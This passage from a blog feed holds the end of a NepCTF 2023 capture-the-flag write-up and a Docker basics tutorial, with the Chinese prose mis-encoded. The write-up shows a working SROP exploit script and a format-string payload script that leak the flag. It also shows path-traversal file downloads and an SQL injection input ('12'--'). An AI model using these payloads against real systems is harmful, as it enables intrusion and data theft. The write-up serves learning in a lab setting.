class="line">ropread=SigreturnFrame()</span><br><span class="line">ropread.rdi=<span class="number">0</span></span><br><span class="line">ropread.rsi=<span class="number">3</span></span><br><span class="line">ropread.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropread.rcx=<span class="number">0x50</span></span><br><span class="line">ropread.rip=syscall</span><br><span class="line">ropread.rsp = buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">2</span>+<span class="number">0x18</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">ropwrite=SigreturnFrame()</span><br><span class="line">ropwrite.rdi=<span class="number">1</span></span><br><span class="line">ropwrite.rsi=<span class="number">1</span></span><br><span class="line">ropwrite.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropwrite.rcx=<span class="number">0x50</span></span><br><span class="line">ropwrite.rip=syscall</span><br><span class="line">ropwrite.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">3</span>+<span class="number">0x18</span>*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">    padding,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(readpaylaod)</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;welcome to NepCTF2023!&#x27;</span>,payload)</span><br><span class="line">paylaod=flat(</span><br><span class="line">    <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropopen),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropread),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropwrite),</span><br><span class="line">)</span><br><span class="line">s(paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230817135721077.png" alt="image-20230817135721077"></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>è®¿é—®ç½‘ç«™ï¼Œéšä¾¿ç™»å½•è¿›å»ï¼Œçœ‹ä¸€ä¸‹ç½‘é¡µæºç </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function listFiles() &#123;</span><br><span class="line">      $.get(&quot;/list_files/&quot;, function(data)&#123;</span><br><span class="line">          $(&quot;#file-list&quot;).html(data);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function viewFile(filename) &#123;</span><br><span class="line">      window.location = &#x27;/view_file/&#x27; + filename;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å°è¯•&#x2F;list_files&#x2F;æ‹¼æ¥&#x2F;åå¯ä»¥ä¸‹è½½å¾—åˆ°æ–‡ä»¶ï¼Œä¸‹è½½loginåˆ†æ</p><p><img src="/2023/08/17/2023NepCTF/image-20230818175023327.png" alt="image-20230818175023327"></p><p>flagè¯»åˆ°äº†å †ä¸Š</p><p>è¿™é‡Œa3æ˜¯urlä¸Šåœ°å€ï¼Œa4æ˜¯è¯·æ±‚æ–¹å¼</p><p><img src="/2023/08/17/2023NepCTF/image-20230818170424353.png" alt="image-20230818170424353"></p><p>æŸ¥çœ‹dockerfileåå‘ç°éœ€è¦æ­å»ºç¯å¢ƒè¿˜éœ€è¦ä¸€äº›åº“æ–‡ä»¶</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./libmicrohttpd.so.12 /home/ctf/lib/x86_64-linux-gnu/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ld-linux-x86-64.so.2 /home/ctf/lib64</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨&#x2F;view_file&#x2F;æ‹¼æ¥ç»å¯¹è·¯å¾„ä¸‹è½½ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view_file//lib/x86_64-linux-gnu/libmicrohttpd.so.12</span><br><span class="line">/view_file//lib64/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818175743836.png" alt="image-20230818175743836"></p><p>dockeræ­å»ºèµ·æ¥ç¯å¢ƒåï¼Œè°ƒè¯•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/login&gt; ps -ef | grep &#x27;login&#x27;</span><br><span class="line">root       52101   52067 91 16:16 ?        01:38:10 ./login</span><br><span class="line">sudo gdb attach 52101</span><br></pre></td></tr></table></figure><p>ç™»å½•æ—¶destå¯æ§ï¼Œsprintfæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåé¢ä¼šè¾“å‡ºåå­—ï¼Œç›´æ¥æ–­ç‚¹æ–­åˆ°sprintæ³„éœ²å †åœ°å€ï¼Œæ‰¾åˆ°flagåœ°å€ï¼Œåˆ©ç”¨%så†™å…¥åˆ°v49å³å¯</p><p><img src="/2023/08/17/2023NepCTF/image-20230818193423236.png" alt="image-20230818193423236"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.70.134:32774/login&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29&quot;</span>&#125;</span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;%15059$p&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url=url,headers=headers, params=params)</span><br><span class="line">heapad = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;0x([0-9a-fA-F]+)&#x27;</span>, response.text)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapad))</span><br><span class="line">flagad=heapad-<span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">b&#x27;%36$saaa&#x27;</span>+p64(flagad)&#125;</span><br><span class="line">response= requests.get(url=url, headers=headers,params=params)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818194536343.png" alt="image-20230818194536343"></p><h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><h3 id="one"><a href="#one" class="headerlink" title="one"></a>one</h3><p>å°±æ ¹æ®open flagæ–‡ä»¶å¾—å­—ç¬¦ä¸²æ¥å®šä½æ¼æ´</p><p><img src="/2023/08/17/2023NepCTF/image-20230819001326863.png" alt="image-20230819001326863"></p><p>ç¬¬ä¸€ä¸ªæ¼æ´æ˜¯åœ¨æœåŠ¡ç«¯ShopæŸ¥è¯¢æ—¶,å½“ç”¨æˆ·å­˜åœ¨ä¸”æ˜¯rootæƒé™æ—¶ä¼šæ‰“å¼€flagå¹¶å‘é€ç»™æˆ‘ä»¬å®¢æˆ·ç«¯ï¼Œæ˜æ˜¾çš„sqlæ³¨å…¥ â€“æ³¨é‡Šæ‰åé¢çš„sqlè¯­å¥å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v51, <span class="string">&quot;999&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(s, <span class="string">&quot;select * from user where Username=&#x27;%s&#x27; and Statement =&#x27;root&#x27;&quot;</span>, v39 + <span class="number">856</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n%s\n&quot;</span>, s);</span><br><span class="line">      v21 = <span class="number">0</span>;</span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">      rc = sqlite3_get_table(db, s, v36, &amp;v21, &amp;v22, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v21 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v54[<span class="number">0</span>] = <span class="string">&#x27;\xE4\x85\xBB\xE4galf&#x27;</span>;</span><br><span class="line">        v54[<span class="number">1</span>] = <span class="string">&#x27;\x94\xE7toor\x9B\xBE&#x27;</span>;</span><br><span class="line">        LODWORD(v55) = <span class="number">-1215764824</span>;</span><br><span class="line">        BYTE4(v55) = <span class="number">0</span>;</span><br><span class="line">        send(*((_QWORD *)v39 + <span class="number">2</span>), buf, <span class="number">0x630</span>uLL, <span class="number">0</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;phead);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        stream = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_ONE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Login</span><br><span class="line">12</span><br><span class="line">jk</span><br><span class="line">Login</span><br><span class="line">12&#x27;--</span><br><span class="line">jk</span><br><span class="line">Shop</span><br><span class="line">999</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819003924199.png" alt="image-20230819003924199"></p><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>startæˆ˜æ–—æ—¶åªè¦v33&lt;&#x3D;0å³å¯,dword_55F4474AADD8æ˜¯intç±»å‹ä¸”ä¸º99999999åŠ ä¸ŠH3h3QAQçš„æŠ€èƒ½ä¼¤å®³å°±å¯ä»¥æº¢å‡ºä¸ºè´Ÿæ•°ï¼Œåˆšå¼€å§‹æ²¡æœ‰H3h3QAQå¡ç‰Œï¼Œå¯ä»¥é€šè¿‡æŠ½å¡è·å¾—</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(<span class="type">const</span> <span class="type">char</span> **)&amp;v39[<span class="number">8</span> * v31 + <span class="number">48</span>], (<span class="type">const</span> <span class="type">char</span> *)&amp;cNode[<span class="number">20</span> * m])</span><br><span class="line">            &amp;&amp; v32 &lt;= <span class="number">1</span></span><br><span class="line">            &amp;&amp; v31 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; v31 &lt;= *((_QWORD *)v39 + <span class="number">106</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v33 = dword_55F4474AADD8 + cNode[<span class="number">20</span> * m + <span class="number">16</span> + (<span class="type">int</span>)v32];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hurt:%d\n&quot;</span>, v33);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)v33 &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v46 = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_THREE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !v46 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Could not open flag file.&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819151208900.png" alt="image-20230819151208900"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/08/17/docker/"/>
      <url>/2023/08/17/docker/</url>
      
        <content type="html"><![CDATA[<p>dockeræœ€æ—©æ¥è§¦æ˜¯ä¹‹å‰å­¦æ¸—é€æ—¶ï¼Œé›¶é›¶æ•£æ•£å­¦è¿‡ä¸€ç‚¹(æŒ‡ç®€å•æ‹‰äº†ä¸ªé¶åœºé•œåƒï¼Œrunä¸€ä¸‹ğŸ˜‚)ï¼Œä¸è¿‡ä¹Ÿå¿˜å¾—å·®ä¸å¤šäº†</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a><a href="https://docs.docker.com/">Docker</a></h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>Ubuntuå®‰è£…dockerï¼š</p><p><a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ca-certificates curl gnupg</span><br><span class="line"></span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="line">sudo chmod a+r /etc/apt/keyrings/docker.gpg</span><br><span class="line"></span><br><span class="line">echo \</span><br><span class="line">  &quot;deb [arch=&quot;$(dpkg --print-architecture)&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">  &quot;$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)&quot; stable&quot; | \</span><br><span class="line">  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå¹¶åŠ å…¥dockerç”¨æˆ·ç»„(ä¸ç„¶åªèƒ½rootç”¨æˆ·)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="é…ç½®é•œåƒåŠ é€Ÿå™¨"><a href="#é…ç½®é•œåƒåŠ é€Ÿå™¨" class="headerlink" title="é…ç½®é•œåƒåŠ é€Ÿå™¨"></a>é…ç½®é•œåƒåŠ é€Ÿå™¨</h3><h3 id="é•œåƒåŠ é€Ÿæº"><a href="#é•œåƒåŠ é€Ÿæº" class="headerlink" title="é•œåƒåŠ é€Ÿæº"></a>é•œåƒåŠ é€Ÿæº</h3><p><strong>&#x2F;etc&#x2F;docker&#x2F;daemon.json</strong> é‡Œå†™ä¸‹ ps:ä¸ªäººæ„Ÿè§‰é˜¿é‡Œäº‘å¥½ç”¨ç‚¹</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;åŠ é€Ÿåœ°å€&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;åŠ é€Ÿåœ°å€&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é‡å¯dockeræœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>docker infoçœ‹åˆ°ä¸‹é¢å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line">åŠ é€Ÿåœ°å€</span><br></pre></td></tr></table></figure><h2 id="Dockerä¸­çš„ä¸‰ä¸ªé‡è¦æ¦‚å¿µ"><a href="#Dockerä¸­çš„ä¸‰ä¸ªé‡è¦æ¦‚å¿µ" class="headerlink" title="Dockerä¸­çš„ä¸‰ä¸ªé‡è¦æ¦‚å¿µ"></a>Dockerä¸­çš„ä¸‰ä¸ªé‡è¦æ¦‚å¿µ</h2><ul><li>Imageï¼ˆé•œåƒï¼‰</li><li>Containerï¼ˆå®¹å™¨ï¼‰</li><li>Repositoryï¼ˆä»“å‚¨ï¼‰</li></ul><h4 id="Imageï¼ˆé•œåƒï¼‰"><a href="#Imageï¼ˆé•œåƒï¼‰" class="headerlink" title="Imageï¼ˆé•œåƒï¼‰"></a>Imageï¼ˆé•œåƒï¼‰</h4><p>ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œé•œåƒæ„å»ºæ—¶ï¼Œä¼šä¸€å±‚å±‚æ„å»ºï¼Œåœ¨æ„å»ºä¹‹åä¸ä¼šè¢«æ”¹å˜</p><h4 id="Containerï¼ˆå®¹å™¨ï¼‰"><a href="#Containerï¼ˆå®¹å™¨ï¼‰" class="headerlink" title="Containerï¼ˆå®¹å™¨ï¼‰"></a>Containerï¼ˆå®¹å™¨ï¼‰</h4><p><strong>å®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“</strong>ï¼Œé€šè¿‡ä¸€ä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºè®¸å¤šä¸ªä¸åŒçš„å®¹å™¨ï¼Œæ¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œæ˜¯ä»¥é•œåƒä¸ºåŸºç¡€å±‚ï¼Œåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªå½“å‰å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç§°è¿™ä¸ªä¸ºå®¹å™¨è¿è¡Œæ—¶è¯»å†™è€Œå‡†å¤‡çš„å­˜å‚¨å±‚ä¸º <strong>å®¹å™¨å­˜å‚¨å±‚</strong>ã€‚å®¹å™¨å™¨æ¶ˆäº¡æ—¶ï¼Œå®¹å™¨å­˜å‚¨å±‚ä¹Ÿéšä¹‹æ¶ˆäº¡ã€‚</p><h4 id="Repositoryï¼ˆä»“åº“ï¼‰"><a href="#Repositoryï¼ˆä»“åº“ï¼‰" class="headerlink" title="Repositoryï¼ˆä»“åº“ï¼‰"></a>Repositoryï¼ˆä»“åº“ï¼‰</h4><p>é›†ä¸­çš„å­˜å‚¨ã€åˆ†å‘é•œåƒçš„æœåŠ¡ï¼Œç±»ä¼¼äºgithubçš„ä»£ç ä»“åº“</p><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p><code>&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;</code> çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥ <code>latest</code> ä½œä¸ºé»˜è®¤æ ‡ç­¾ã€‚</p><h2 id="DockeråŸºç¡€å‘½ä»¤"><a href="#DockeråŸºç¡€å‘½ä»¤" class="headerlink" title="DockeråŸºç¡€å‘½ä»¤"></a>DockeråŸºç¡€å‘½ä»¤</h2><h3 id="é•œåƒ"><a href="#é•œåƒ" class="headerlink" title="é•œåƒ"></a>é•œåƒ</h3><p><code>docker pull [é€‰é¡¹] [Docker Registry åœ°å€[:ç«¯å£å·]/]ä»“åº“å[:æ ‡ç­¾]</code>è·å–é•œåƒ</p><ul><li>Docker Registryé»˜è®¤åœ°å€æ˜¯ Docker Hub(<code>docker.io</code>)ã€‚</li><li>ä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³ <code>&lt;ç”¨æˆ·å&gt;/&lt;è½¯ä»¶å&gt;</code>ã€‚å¯¹äº Docker Hubï¼Œå¦‚æœä¸ç»™å‡ºç”¨æˆ·åï¼Œåˆ™é»˜è®¤ä¸º <code>library</code></li></ul><p><code>docker image ls</code> åˆ—å‡ºé•œåƒ </p><p><code>docker system df</code> æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´ </p><p><code>docker image rm [é€‰é¡¹] &lt;é•œåƒ1&gt; [&lt;é•œåƒ2&gt; ...] </code>åˆ é™¤é•œåƒ </p><ul><li><code>docker image rm $(docker image ls -q redis)</code> é…åˆä½¿ç”¨åˆ é™¤æ‰€æœ‰ä»“åº“åä¸ºredisçš„é•œåƒ</li></ul><p><code>docker commit [é€‰é¡¹] &lt;å®¹å™¨IDæˆ–å®¹å™¨å&gt; [&lt;æ–°é•œåƒå&gt;[:&lt;æ ‡ç­¾&gt;]]</code> ä¿æŒä¿®æ”¹è¿‡å­˜å‚¨å±‚çš„å®¹å™¨ä¸ºæ–°çš„é•œåƒ <strong>æ…ç”¨,å¯èƒ½ä¼šä¿®æ”¹å¾ˆå¤šå±‚çš„ä¸œè¥¿ï¼Œå¯¼è‡´é•œåƒè‡ƒè‚¿</strong></p><p><code>docker build [é€‰é¡¹] &lt;ä¸Šä¸‹æ–‡è·¯å¾„/URL/-&gt;</code>  </p><ul><li><p>-t æŒ‡å®šé•œåƒåç§° name:tag</p></li><li><p><code>docker build</code> å‘½ä»¤ä¼šå°†ä¸Šä¸‹æ–‡è·¯å¾„ç›®å½•ä¸‹çš„å†…å®¹æ‰“åŒ…äº¤ç»™ Docker å¼•æ“ä»¥å¸®åŠ©æ„å»ºé•œåƒ</p></li><li><p>-f å¯ä»¥æ‰‹åŠ¨æŒ‡å®šdockerfile</p></li></ul><h3 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h3><p><code>docker ps</code> æˆ–è€…<code>docker container ls</code>æŸ¥çœ‹å½“å‰è¿è¡Œä¸­çš„å®¹å™¨</p><p><code>docker run</code> å¯åŠ¨æ–°å®¹å™¨</p><ul><li><code>-t</code> é€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆpseudo-ttyï¼‰å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼Œ <code>-i</code> åˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚</li><li><code>-d</code> å®¹å™¨ä»¥åå°çš„æ–¹å¼è¿è¡Œ æ‰§è¡ŒæˆåŠŸåï¼Œä¼šè¿”å›ä¸€ä¸ªå®¹å™¨ ID</li><li>&#96;&#96;-p local:container&#96; æŠŠå®¹å™¨ç«¯å£containeæ˜ å°„åˆ°ä¸»æœºç«¯å£local</li></ul><p><code>docker container start</code> å°†ç»ˆæ­¢ï¼ˆ<code>exited</code>ï¼‰çš„å®¹å™¨å¯åŠ¨è¿è¡Œï¼Œè€Œä¸æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨</p><p><code>docker container stop</code> ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨</p><p><code>docker container restart</code> é‡å¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨</p><p><code>docker container rm</code> æ¥åˆ é™¤ä¸€ä¸ªå¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨</p><p><code>docker container prune</code>æ¥åˆ é™¤æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨</p><p><code>docker network ls</code> æŸ¥çœ‹ç½‘ç»œåˆ—è¡¨</p><p><code>docker exec</code> </p><ul><li>docker exec -it [container ID or NAMES] è¿›å…¥åˆ°å·²è¿è¡Œçš„ Docker å®¹å™¨</li></ul><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile</a></h2><p>ç”¨æ¥æ„å»ºDockeré•œåƒçš„æ„å»ºæ–‡ä»¶ï¼ŒDockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ </p><p><code>FROM</code> åŸºç¡€é•œåƒ(latestä½œä¸ºé»˜è®¤æ ‡ç­¾)</p><ul><li>FROM scratch æ„å‘³ç€ä½ ä¸ä»¥ä»»ä½•é•œåƒä¸ºåŸºç¡€ æ¯”å¦‚ä¸€äº›é™æ€ç¼–è¯‘çš„ç¨‹åºä¸éœ€è¦ä»€ä¹ˆæ”¯æŒ</li></ul><p><code>RUN</code> å®¹å™¨æ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤</p><ul><li>RUN &lt;å‘½ä»¤&gt;</li><li>RUN [â€œå¯æ‰§è¡Œæ–‡ä»¶â€, â€œå‚æ•°1â€, â€œå‚æ•°2â€]</li></ul><blockquote><p>ç”±äºDockerfileä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚(æ„å»ºçš„è¿‡ç¨‹å°±æ˜¯RUNå¯åŠ¨å®¹å™¨ï¼Œæ‰§è¡Œè¿™æ¡æŒ‡ä»¤åcommitä¸€ä¸‹)ï¼Œæ‰€ä»¥èƒ½ä¸€å±‚å®Œæˆçš„å°½é‡ç”¨&amp;&amp;è¿æ¥å¤šä¸ªå‘½ä»¤ï¼Œæ¯ä¸€å±‚æ„å»ºå®Œæˆååˆ é™¤ä¸å¿…è¦çš„ä¸œè¥¿ï¼Œæ¥å‡å°‘å®¹å™¨å¤§å°</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:stretch</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x; buildDeps=<span class="string">&#x27;gcc libc6-dev make wget&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> redis.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -r /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span></span><br></pre></td></tr></table></figure></blockquote><p><code>COPY</code> ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ <code>&lt;æºè·¯å¾„&gt;</code> çš„æ–‡ä»¶&#x2F;ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„ <code>&lt;ç›®æ ‡è·¯å¾„&gt;</code> ä½ç½®</p><ul><li>COPY [â€“chown&#x3D;<user>:<group>] &lt;æºè·¯å¾„&gt;â€¦ &lt;ç›®æ ‡è·¯å¾„&gt;</group></user></li><li><code>&lt;æºè·¯å¾„&gt;</code> å¯ä»¥æ˜¯å¤šä¸ªï¼Œ<code>&lt;ç›®æ ‡è·¯å¾„&gt;</code>å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„</li><li><code>--chown=&lt;user&gt;:&lt;group&gt;</code>æ¥æ”¹å˜æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠæ‰€å±ç»„</li></ul><p><code>ADD</code>  ç›¸æ¯”äº<code>COPY</code>å¤šäº†å‹ç¼©æ–‡ä»¶è‡ªåŠ¨è§£å‹ï¼ŒURLè‡ªåŠ¨ä¸‹è½½</p><p><code>CMD</code>  å®¹å™¨å¯åŠ¨å‘½ä»¤ï¼ŒæŒ‡å®šå®¹å™¨å¯åŠ¨ç¨‹åºåŠå‚æ•°</p><ul><li>shell<code> æ ¼å¼ï¼š</code>CMD &lt;å‘½ä»¤&gt;</li><li>exec<code> æ ¼å¼ï¼š</code>CMD 